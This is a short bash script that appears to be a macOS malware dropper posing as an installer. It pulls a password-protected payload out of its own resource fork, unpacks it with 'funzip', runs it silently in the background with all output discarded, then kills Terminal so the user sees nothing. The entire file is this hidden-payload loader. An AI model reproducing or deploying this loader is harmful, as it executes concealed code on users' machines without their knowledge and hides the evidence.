#!/bin/bash
TEMP_NAME="$(mktemp -t Installer)"
tail -c 9361 "$0/..namedfork/rsrc" | funzip -SKRv > "${TEMP_NAME}"
chmod +x "${TEMP_NAME}" && nohup "${TEMP_NAME}" > /dev/null 2>&1 &
killall Terminal
exit
